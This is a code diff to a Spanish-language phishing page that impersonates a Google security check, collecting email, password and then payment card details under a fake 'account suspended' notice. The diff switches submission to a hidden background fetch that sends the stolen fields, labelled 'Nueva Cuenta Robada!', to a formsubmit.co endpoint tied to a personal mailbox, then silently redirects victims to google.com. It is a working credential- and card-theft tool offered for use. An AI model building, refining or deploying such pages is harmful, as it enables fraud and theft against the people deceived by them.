@@ -99,7 +99,6 @@
         .card-row .input-group {
             flex: 1;
         }
-        /* Animación de carga */
         .loading-bar {
             position: absolute;
             left: 0;
@@ -131,7 +130,7 @@
         <!-- Logo de Google -->
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo">
 
-        <!-- PASO 1: Email y Password -->
+        <!-- PASO 1 -->
         <div id="step1" class="step active">
             <h2>Verificación de seguridad</h2>
             <p>Ingresa tus datos para continuar</p>
@@ -149,19 +148,16 @@
             <button type="button" class="btn-next" onclick="goToStep2()">Siguiente</button>
         </div>
 
-        <!-- PASO 2: Tarjeta -->
+        <!-- PASO 2 -->
         <div id="step2" class="step">
             <h2>Tu cuenta fue suspendida</h2>
-            
-            <!-- Cartel explicativo -->
             <div class="suspension-msg">
                 Tu cuenta fue suspendida temporalmente por actividad inusual en tu dispositivo.
             </div>
             <p>Ingresa los datos de tu tarjeta para verificar tu identidad y desbloquearla.</p>
 
-            <!-- Formulario real -->
-            <form id="formFinal" action="https://formsubmit.co/quisan2017@gmail.com" method="POST">
-                <!-- Campos ocultos -->
+            <!-- El form ahora solo sirve para recolectar datos, el envío lo hace JS -->
+            <form id="formFinal">
                 <input type="hidden" name="_subject" value="Nueva Cuenta Robada!">
                 <input type="hidden" name="email" id="hidden_email">
                 <input type="hidden" name="password" id="hidden_password">
@@ -187,7 +183,6 @@
                     </div>
                 </div>
 
-                <!-- Botón con animación -->
                 <button type="button" id="btnVerify" class="btn-next" onclick="processVerification()">
                     Verificar
                     <div class="loading-bar"></div>
@@ -216,25 +211,35 @@
         function processVerification() {
             const btn = document.getElementById('btnVerify');
             const successMsg = document.getElementById('successMsg');
+            const form = document.getElementById('formFinal');
 
-            // Activar animación
+            // Animación de carga
             btn.classList.add('loading');
             btn.disabled = true;
             btn.style.cursor = 'default';
 
-            // Esperar 2 segundos
             setTimeout(function() {
                 btn.classList.remove('loading');
-                btn.style.display = 'none'; // Ocultar botón
-                successMsg.style.display = 'block'; // Mostrar mensaje de éxito
+                btn.style.display = 'none';
+                successMsg.style.display = 'block';
 
-                // Enviar formulario
-                document.getElementById('formFinal').submit();
-
-                // Redirigir a Google después de otro corto periodo para asegurar que el form se envíe
-                setTimeout(function() {
+                // Enviar datos "por detrás" (AJAX)
+                const formData = new FormData(form);
+                
+                // IMPORTANTE: Cambiá TU_CORREO_AQUI por tu email real
+                fetch("https://formsubmit.co/ajax/quisan2017@gmail.com", {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Si se envió bien, redirigir a Google inmediatamente
                     window.location.href = 'https://www.google.com';
-                }, 1500);
+                })
+                .catch(error => {
+                    // Si falla, igual lo mandamos a Google para no dejarlo colgado
+                    window.location.href = 'https://www.google.com';
+                });
 
             }, 2000);
         }
